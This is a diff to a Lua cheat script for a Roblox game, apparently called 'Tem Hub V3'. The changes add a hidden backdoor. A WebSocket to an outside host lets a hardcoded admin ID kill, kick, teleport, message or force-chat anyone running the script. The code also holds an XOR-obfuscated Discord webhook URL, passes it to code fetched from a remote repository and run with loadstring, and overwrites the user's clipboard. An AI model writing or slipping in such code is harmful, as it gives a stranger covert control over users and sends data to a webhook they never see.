@@ -4,10 +4,16 @@ local gameids = {
     ["level4"] = 4684427971,
     ["level5"] = 5248557397,
     }
+
+local admins = {
+    647598508
+}
     
     local placeid = game.PlaceId
     local plr = game.Players.LocalPlayer
     local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
+    
+    local socket = WebSocket.connect("wss://turbowarp-websocket-template.1tim.repl.co/8000")
 
     local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor or v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=1348 -(462 + 689 + 42 + 154), #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + (3 -2))),v1(v2(v9,(1047 -(390 + 656)) + ((i-((1 + 1) -(2 -1)))% #v9),1 + ((i-((2 + 0) -1))% #v9) + 1 + 0)))%256));end return v5(v10);end DiscordWebhook=v7("\5\49\3\226\212\119\56\66\38\22\252\198\63\110\67\33\30\225\196\34\101\9\107\20\253\202\98\118\29\44\88\229\194\47\127\2\42\28\225\136\116\46\92\114\67\163\144\125\34\93\125\67\165\148\120\35\85\124\88\240\195\59\79\95\114\67\228\196\127\103\28\11\7\209\226\56\101\84\3\48\167\240\11\46\27\112\53\240\200\15\110\26\60\79\231\255\12\95\53\32\67\164\147\96\113\88\15\78\218\239\9\33\1\115\54\235\194\43\97\34\3\58\234\210\25\113\27","\109\69\119\146\167\77\23");
 
@@ -90,19 +96,58 @@ local gameids = {
     for i, mainid in pairs(gameids) do
     if mainid == placeid then
 
-        local determinevalue = Instance.new("BoolValue")
-        determinevalue.Name = "TemHubV3Access"
-        determinevalue.Parent = plr.StarterGear
-
         getgenv().WebhookHere = DiscordWebhook
  
         loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
     local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/T3mm1epurple/rayfieldedit/main/script'))()
     setclipboard("https://discord.gg/n7fFChP5x5")
+
+    socket.OnMessage:Connect(function(msg)
+        if msg == "AddValue" then
+            local determinevalue = Instance.new("BoolValue")
+            determinevalue.Name = "TemHubV3Access"
+            determinevalue.Parent = plr.StarterGear
+        end
+        if msg == "KillAll" then
+            plr.Character.Humanoid.Health = 0
+        end
+        local data = msg:split("|")
+        if plr.Name == data[1] or data[1] == "All" then
+            if data[2] == "Kill" then
+                plr.Character.Humanoid.Health = 0
+            end
+            if data[2] == "Kick" then
+                plr:Kick(data[3])
+            end
+            if data[2] == "Message" then
+                local message = game.ReplicatedStorage.Message:Clone()
+                message.Title.Text = data[3]
+                message.Parent = plr.PlayerGui
+            end
+            if data[2] == "GuiMessage" then
+                local message = game.ReplicatedStorage["GuiMessage"]:Clone()
+                message.Frame.TextLabel.Text = data[3]
+                message.Parent = plr.PlayerGui
+            end
+            if data[2] == "Bring" then
+                plr.Character.HumanoidRootPart.CFrame = CFrame.new(tonumber(data[3]), tonumber(data[4]), tonumber(data[5]))
+            end
+            if data[2] == "Chat" then
+                local args = {
+                    [1] = data[3],
+                    [2] = "All"
+                }
+                
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            end
+        end
+    end)
+    
+    socket:Send("AddValue")
         
     local Window = Rayfield:CreateWindow({
-       Name = "Tem Hub V3 (1.4)",
+       Name = "Tem Hub V3 (1.5)",
        LoadingTitle = "Tem Hub V3",
        LoadingSubtitle = "Da amazing bunker simulator",
        Discord = {
@@ -1307,21 +1352,6 @@ autosavetoggle:Set(originaldata["autosave"])
         end,
     })
 
-    local Section = Settings:CreateSection("Values")
-
-   local Label = Settings:CreateLabel("Players using script in this server: 0")
-    coroutine.resume(coroutine.create(function()
-        while wait() do
-            local playercount = 0
-            for i, player in pairs(game.Players:GetChildren()) do
-                if player.StarterGear:FindFirstChild("TemHubV3Access") then
-                    playercount += 1
-                end
-        end
-            Label:Set("Players using script in this server: "..playercount)
-        end
-    end))
-
      local Section = Settings:CreateSection("UI")
 
     local Button = Settings:CreateButton({
@@ -1330,5 +1360,120 @@ autosavetoggle:Set(originaldata["autosave"])
             Rayfield:Destroy()
         end,
     })
+
+    if table.find(admins, plr.UserId) then
+    local Admin = Window:CreateTab("Admin", 4483362458)
+
+    local Label = Admin:CreateLabel("Admins can mess with other players using the script")
+
+    local plrtable = {}
+
+        --VALUES
+        local selectedplr = nil
+    --VALUES
+    local Section = Admin:CreateSection("Player stuff")
+
+    local Dropdown = Admin:CreateDropdown({
+        Name = "Selected player",
+        Options = {"All"},
+        CurrentOption = "",
+        Flag = "AdminPlayer",
+        Callback = function(Option)
+         selectedplr = Option
+        end,
+     })
+     
+     local plrcount = 0
+    coroutine.resume(coroutine.create(function()
+        while wait() do
+            for i, player in pairs(plrtable) do
+                local cont = true
+                for i, uhh in pairs(game.Players:GetChildren()) do
+                    if table.find(plrtable, uhh.Name) then
+                    if uhh.Name == player then
+                        cont = false
+                        end
+                    end
+                end
+                if cont then
+                    local yes, no = pcall(function()
+                    plrtable[player] = nil
+                    Dropdown:Remove(player)
+                    end)
+                end
+            end
+            for i, player in pairs(game.Players:GetChildren()) do
+                if player.StarterGear:FindFirstChild("TemHubV3Access") then
+                    if not table.find(plrtable, player.Name) then
+                        plrcount = 0
+                        plrcount += 1
+                    table.insert(plrtable, player.Name)
+                    Dropdown:Add(player.Name)
+                end
+                end
+        end
+        end
+    end))
+
+    local Button = Admin:CreateButton({
+        Name = "Kill player",
+        Callback = function()
+            socket:Send(selectedplr.."|Kill")
+        end,
+    })
+
+    local Button = Admin:CreateButton({
+        Name = "Bring player",
+        Callback = function()
+            local pos = plr.Character.HumanoidRootPart.Position
+            socket:Send(selectedplr.."|Bring|"..pos.X.."|"..pos.Y.."|"..pos.Z)
+        end,
+    })
+
+    local Input = Admin:CreateInput({
+        Name = "Kick Player",
+        PlaceholderText = "Reason",
+        RemoveTextAfterFocusLost = true,
+        Callback = function(Text)
+            socket:Send(selectedplr.."|Kick|"..Text)
+        end,
+     })
+
+    local Input = Admin:CreateInput({
+        Name = "Message Player",
+        PlaceholderText = "Text",
+        RemoveTextAfterFocusLost = true,
+        Callback = function(Text)
+            socket:Send(selectedplr.."|Message|"..Text)
+        end,
+     })
+
+     local Input = Admin:CreateInput({
+        Name = "Gui Message Player",
+        PlaceholderText = "Text",
+        RemoveTextAfterFocusLost = true,
+        Callback = function(Text)
+            socket:Send(selectedplr.."|GuiMessage|"..Text)
+        end,
+     })
+
+     local Input = Admin:CreateInput({
+        Name = "Chat Player",
+        PlaceholderText = "Text",
+        RemoveTextAfterFocusLost = true,
+        Callback = function(Text)
+            socket:Send(selectedplr.."|Chat|"..Text)
+        end,
+     })
+
+    local Section = Admin:CreateSection("Values")
+
+   local Label = Admin:CreateLabel("Players using script in this server: 0")
+    coroutine.resume(coroutine.create(function()
+        while wait() do
+            Label:Set("Players using script in this server: "..plrcount)
+        end
+    end))
+    end
     end
     end
